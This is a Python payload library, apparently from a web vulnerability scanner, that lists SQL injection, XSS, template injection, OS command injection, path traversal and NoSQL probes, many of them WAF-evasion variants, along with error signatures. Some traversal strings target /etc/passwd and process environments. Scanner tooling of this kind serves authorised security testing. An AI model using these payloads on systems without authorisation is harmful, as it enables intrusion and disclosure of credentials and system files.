"""Advanced payload library for Danger Mode.

Detection payloads are cheap and broad; confirmation payloads are precise and
only ever sent to an input point that already produced a signal. Modern targets
sit behind WAFs and normalizing proxies, so each family carries encoding, case,
comment, and whitespace variants rather than one canonical string.

Nothing here writes, updates, or deletes target data. Confirmation payloads
extract only a non-sensitive proof value (a version banner, an arithmetic
result, an OS name) — never rows, records, credentials, or personal data.
"""

from __future__ import annotations

from dataclasses import dataclass

from app.tasks.vulnscan.danger.budget import CANARY

#: Arithmetic proof: distinctive result that cannot occur by chance.
MATH_A = 8675
MATH_B = 3099
MATH_PRODUCT = str(MATH_A * MATH_B)  # 8675 * 3099 -> "26883825"


@dataclass(frozen=True)
class Payload:
    """One probe with the metadata the report needs to explain it."""

    category: str
    value: str
    intent: str
    #: Regex or literal that indicates the payload achieved its effect.
    expect: str = ""
    #: Database/engine/OS this variant targets, when specific.
    flavour: str = "generic"


# ── SQL injection ─────────────────────────────────────────────────────────────

#: Broad, cheap detection probes. A signal here triggers confirmation below.
SQL_DETECTION: tuple[Payload, ...] = (
    Payload("quote", "'", "Single quote to provoke a parser error"),
    Payload("double_quote", '"', "Double quote to provoke a parser error"),
    Payload("backtick", "`", "Backtick identifier quote (MySQL)"),
    Payload("paren_quote", "')", "Closes a quoted function argument"),
    Payload("comment_tail", f"'-- {CANARY}", "Quote plus comment terminator"),
    Payload("comment_hash", f"'#{CANARY}", "Quote plus MySQL hash comment"),
    Payload("null_byte", "'%00", "Null byte after quote to truncate parsing"),
)

#: WAF-evasion spellings of the same boolean condition. Modern WAFs block the
#: canonical `OR 1=1`, so the variants matter more than the base case.
SQL_BOOLEAN_TRUE: tuple[Payload, ...] = (
    Payload("boolean_plain", "' AND '1'='1", "Always-true string comparison"),
    Payload("boolean_inline_comment", "'/**/AND/**/'1'='1", "Inline comments replace spaces"),
    Payload("boolean_case", "' aNd '1'='1", "Mixed case to defeat keyword matching"),
    Payload("boolean_encoded", "%27%20AND%20%271%27%3D%271", "URL-encoded comparison"),
    Payload("boolean_newline", "'%0aAND%0a'1'='1", "Newline whitespace substitution"),
    Payload("boolean_like", "' AND '1' LIKE '1", "LIKE instead of = to dodge signatures"),
)
SQL_BOOLEAN_FALSE: tuple[Payload, ...] = (
    Payload("boolean_plain", "' AND '1'='2", "Always-false string comparison"),
    Payload("boolean_inline_comment", "'/**/AND/**/'1'='2", "Inline comments replace spaces"),
    Payload("boolean_case", "' aNd '1'='2", "Mixed case to defeat keyword matching"),
    Payload("boolean_encoded", "%27%20AND%20%271%27%3D%272", "URL-encoded comparison"),
    Payload("boolean_newline", "'%0aAND%0a'1'='2", "Newline whitespace substitution"),
    Payload("boolean_like", "' AND '1' LIKE '2", "LIKE instead of = to dodge signatures"),
)

#: Numeric-context arithmetic. If `id=3-2` renders the same page as `id=1`,
#: the parameter is evaluated by the database, which is conclusive.
SQL_NUMERIC_ARITHMETIC: tuple[str, ...] = ("{n}-0", "{n}*1", "{n}+0", "({n})")

#: Version banner extraction — the proof value. Bounded to a version string;
#: no table, column, row, or credential data is ever requested.
SQL_VERSION_PROBES: tuple[Payload, ...] = (
    Payload("union_mysql", "' UNION SELECT @@version-- ", "MySQL/MariaDB version banner",
            r"\b\d+\.\d+\.\d+[\w.-]*(?:MariaDB|MySQL)?", "mysql"),
    Payload("union_postgres", "' UNION SELECT version()-- ", "PostgreSQL version banner",
            r"PostgreSQL \d+\.\d+", "postgres"),
    Payload("union_mssql", "' UNION SELECT @@version-- ", "MSSQL version banner",
            r"Microsoft SQL Server\s+\d{4}", "mssql"),
    Payload("union_sqlite", "' UNION SELECT sqlite_version()-- ", "SQLite version banner",
            r"\b3\.\d+\.\d+", "sqlite"),
    Payload("error_extractvalue", "' AND extractvalue(1,concat(0x7e,version()))-- ",
            "MySQL error-based version disclosure", r"XPATH syntax error.*?~([\w.\-]+)", "mysql"),
    Payload("error_cast_postgres", "' AND 1=cast(version() as int)-- ",
            "PostgreSQL cast-error version disclosure", r"PostgreSQL \d+\.\d+", "postgres"),
    Payload("error_convert_mssql", "' AND 1=convert(int,@@version)-- ",
            "MSSQL convert-error version disclosure", r"Microsoft SQL Server\s+\d{4}", "mssql"),
)

#: Time-based blind, one bounded delay per DBMS family.
SQL_TIME_PROBES: tuple[Payload, ...] = (
    Payload("time_mysql", "' AND SLEEP({delay})-- ", "MySQL SLEEP delay", "", "mysql"),
    Payload("time_postgres", "'; SELECT pg_sleep({delay})-- ", "PostgreSQL pg_sleep delay", "", "postgres"),
    Payload("time_mssql", "'; WAITFOR DELAY '0:0:{delay}'-- ", "MSSQL WAITFOR delay", "", "mssql"),
    Payload("time_oracle", "' AND 1=dbms_pipe.receive_message('a',{delay})-- ", "Oracle pipe delay", "", "oracle"),
)

#: Error signatures, expanded well past the classic MySQL strings.
SQL_ERROR_SIGNATURES: dict[str, tuple[str, ...]] = {
    "mysql": ("sql syntax", "mysql_fetch", "mysqli", "you have an error in your sql",
              "warning: mysql", "mariadb server version", "xpath syntax error"),
    "postgres": ("pg_query", "postgresql", "psqlexception", "unterminated quoted string",
                 "invalid input syntax for", "pg::syntaxerror"),
    "mssql": ("unclosed quotation mark", "incorrect syntax near", "microsoft ole db provider",
              "sqlserver jdbc driver", "system.data.sqlclient", "conversion failed when converting"),
    "oracle": ("ora-01756", "ora-00933", "ora-00921", "quoted string not properly terminated",
               "oracle error", "oracle.jdbc"),
    "sqlite": ("sqlite3.operationalerror", "sqlite_error", "unrecognized token", "sqlitemanager"),
    "generic": ("sqlstate", "odbc driver", "database error", "syntax error at or near"),
}


# ── Cross-site scripting ──────────────────────────────────────────────────────

#: A polyglot survives more contexts than any single payload, so one request
#: covers HTML body, attribute, and JavaScript string contexts at once.
XSS_POLYGLOT = (
    f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=1)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/"
    f"</scRipt/--!>\\x3csVg/<sVg/oNloAd=//{CANARY}//>\\x3e"
)

XSS_DETECTION: tuple[Payload, ...] = (
    Payload("context_probe", f"{CANARY}'\"><`", "Metacharacter probe to reveal encoding context"),
    Payload("polyglot", XSS_POLYGLOT, "Multi-context polyglot"),
    Payload("svg_onload", f'"><svg/onload=window.__rt="{CANARY}">', "Attribute break into inert SVG handler"),
    Payload("img_onerror", f'"><img src=x onerror=window.__rt="{CANARY}">', "Attribute break into inert img handler"),
    Payload("script_block", f'<script>window.__rt="{CANARY}"</script>', "Direct script element"),
    Payload("js_string_break", f'";window.__rt="{CANARY}";//', "Breaks out of a JavaScript string literal"),
    Payload("template_literal", f"${{window.__rt='{CANARY}'}}", "Template-literal expression injection"),
    Payload("event_no_space", f'"><svg/onload=window.__rt=1//{CANARY}', "Slash instead of space to dodge filters"),
    Payload("case_mixed", f'"><ScRiPt>window.__rt="{CANARY}"</ScRiPt>', "Mixed case tag"),
    Payload("html_entity", f'"><svg onload=&#119;indow.__rt=1>//{CANARY}', "Entity-encoded sink name"),
)

#: Characters whose survival determines whether the context is exploitable.
XSS_CONTEXT_CHARS = ("<", ">", '"', "'", "`", "(", ")", "/")


# ── Server-side template injection ────────────────────────────────────────────

SSTI_DETECTION: tuple[Payload, ...] = (
    Payload("jinja_twig", f"{{{{{MATH_A}*{MATH_B}}}}}", "Jinja2/Twig arithmetic", MATH_PRODUCT, "jinja2/twig"),
    Payload("dollar_brace", f"${{{MATH_A}*{MATH_B}}}", "JSP/Freemarker/JS arithmetic", MATH_PRODUCT, "freemarker/jsp"),
    Payload("hash_brace", f"#{{{MATH_A}*{MATH_B}}}", "Ruby/Thymeleaf arithmetic", MATH_PRODUCT, "ruby/thymeleaf"),
    Payload("velocity", f"#set($x={MATH_A}*{MATH_B})$x", "Velocity arithmetic", MATH_PRODUCT, "velocity"),
    Payload("erb", f"<%= {MATH_A}*{MATH_B} %>", "ERB arithmetic", MATH_PRODUCT, "erb"),
    Payload("smarty", f"{{{MATH_A}*{MATH_B}}}", "Smarty arithmetic", MATH_PRODUCT, "smarty"),
    # Handlebars has no arithmetic, so it proves evaluation by unwrapping a
    # distinctive constant. A bare number would also match the literal echo of
    # another engine's payload, which is not proof of anything.
    Payload("handlebars", f'{{{{#with "{CANARY}"}}}}{{{{this}}}}{{{{/with}}}}', "Handlebars block evaluation", CANARY, "handlebars"),
)

#: Engine identification once evaluation is confirmed. Read-only introspection
#: of the engine itself; no filesystem, environment, or object access.
SSTI_ENGINE_PROBES: tuple[Payload, ...] = (
    Payload("jinja_self", "{{7*'7'}}", "Jinja2 repeats the string; Twig returns 49", "7777777", "jinja2"),
    Payload("twig_self", "{{7*'7'}}", "Twig coerces to 49", "49", "twig"),
    Payload("freemarker_id", "${7*'7'}", "Freemarker rejects string multiplication", "", "freemarker"),
)


# ── OS command injection ──────────────────────────────────────────────────────

COMMAND_DETECTION: tuple[Payload, ...] = (
    Payload("semicolon_echo", f";echo {CANARY}", "Separator with benign echo", CANARY),
    Payload("pipe_echo", f"|echo {CANARY}", "Pipe with benign echo", CANARY),
    Payload("and_echo", f"&&echo {CANARY}", "Conditional AND with benign echo", CANARY),
    Payload("subshell", f"$(echo {CANARY})", "Subshell substitution", CANARY),
    Payload("backtick", f"`echo {CANARY}`", "Backtick substitution", CANARY),
    Payload("newline", f"%0aecho {CANARY}", "Encoded newline separator", CANARY),
    Payload("windows_amp", f"&echo {CANARY}", "Windows separator", CANARY),
    Payload("ifs_bypass", f";echo${{IFS}}{CANARY}", "IFS substitution for blocked spaces", CANARY),
    Payload("quote_break", f"';echo {CANARY};'", "Breaks out of a single-quoted argument", CANARY),
)

#: Arithmetic proof — the shell must evaluate it, so a match is conclusive.
COMMAND_ARITHMETIC: tuple[Payload, ...] = (
    Payload("posix_math", f";echo $(({MATH_A}*{MATH_B}))", "POSIX shell arithmetic", MATH_PRODUCT, "posix"),
    Payload("windows_math", f"&set /a {MATH_A}*{MATH_B}", "Windows cmd arithmetic", MATH_PRODUCT, "windows"),
)

#: OS identification. Discloses platform only — no file, user, or network data.
COMMAND_OS_PROBES: tuple[Payload, ...] = (
    Payload("uname", ";uname -s", "POSIX OS name", r"\b(Linux|Darwin|FreeBSD|SunOS)\b", "posix"),
    Payload("windows_ver", "&ver", "Windows version string", r"Microsoft Windows \[?Version", "windows"),
)

COMMAND_ERROR_SIGNATURES: tuple[str, ...] = (
    "sh: 1:", "/bin/sh", "command not found", "is not recognized as an internal",
    "cannot execute", "system cannot find the path", "permission denied",
)


# ── Path traversal ────────────────────────────────────────────────────────────

TRAVERSAL_PAYLOADS: tuple[Payload, ...] = (
    Payload("plain", "../../../../etc/passwd", "Plain dot-dot-slash", "root:x:0:0", "unix"),
    Payload("url_encoded", "..%2f..%2f..%2f..%2fetc%2fpasswd", "Encoded slash", "root:x:0:0", "unix"),
    Payload("dot_encoded", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Encoded dots", "root:x:0:0", "unix"),
    Payload("double_slash", "....//....//....//....//etc/passwd", "Doubled sequence defeats naive stripping", "root:x:0:0", "unix"),
    Payload("double_encoded", "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Double URL encoding", "root:x:0:0", "unix"),
    Payload("semicolon", "..;/..;/..;/etc/passwd", "Path-parameter separator", "root:x:0:0", "unix"),
    Payload("utf8_overlong", "..%c0%af..%c0%af..%c0%afetc/passwd", "Overlong UTF-8 slash", "root:x:0:0", "unix"),
    Payload("null_truncate", "../../../../etc/passwd%00.png", "Null byte extension truncation", "root:x:0:0", "unix"),
    Payload("absolute", "/etc/passwd", "Absolute path when concatenation is naive", "root:x:0:0", "unix"),
    Payload("windows_back", r"..\..\..\..\windows\win.ini", "Windows backslash", "[fonts]", "windows"),
    Payload("windows_encoded", "..%5c..%5c..%5cwindows%5cwin.ini", "Encoded backslash", "[fonts]", "windows"),
    Payload("proc_self", "../../../../proc/self/environ", "Process environment via procfs", "PATH=", "unix"),
)

#: File signatures used to confirm a read. Only the signature name and a byte
#: count are ever reported; contents are fingerprinted and discarded.
FILE_SIGNATURES: tuple[tuple[str, str, str], ...] = (
    ("unix_passwd", "root:x:0:0", "Unix account database"),
    ("unix_shadow", "root:$", "Unix password hashes"),
    ("windows_ini", "[fonts]", "Windows win.ini"),
    ("windows_boot", "[boot loader]", "Windows boot.ini"),
    ("proc_environ", "PATH=", "Process environment"),
    ("ssh_private_key", "BEGIN OPENSSH PRIVATE KEY", "SSH private key"),
    ("env_file", "DB_PASSWORD=", "Application .env file"),
)


# ── NoSQL ─────────────────────────────────────────────────────────────────────

NOSQL_PAYLOADS: tuple[Payload, ...] = (
    Payload("operator_ne", '{"$ne": null}', "Not-equal operator matches every document"),
    Payload("operator_gt", '{"$gt": ""}', "Greater-than operator matches every document"),
    Payload("operator_regex", '{"$regex": ".*"}', "Regex operator matches every document"),
    Payload("operator_in", '{"$in": [1,2,3]}', "Membership operator"),
    Payload("where_true", '{"$where": "1==1"}', "Server-side JavaScript predicate"),
    Payload("bracket_ne", "[$ne]=", "Bracket notation for form-encoded bodies"),
)

NOSQL_ERROR_SIGNATURES: tuple[str, ...] = (
    "mongoerror", "cast to objectid failed", "bson", "mongoose", "unknown operator",
    "$where", "e11000", "mongoservererror",
)


def sql_error_flavour(body: str) -> str:
    """Return the DBMS family whose error signature appears in ``body``."""
    lowered = body.lower()
    for flavour, markers in SQL_ERROR_SIGNATURES.items():
        if flavour == "generic":
            continue
        if any(marker in lowered for marker in markers):
            return flavour
    if any(marker in lowered for marker in SQL_ERROR_SIGNATURES["generic"]):
        return "generic"
    return ""
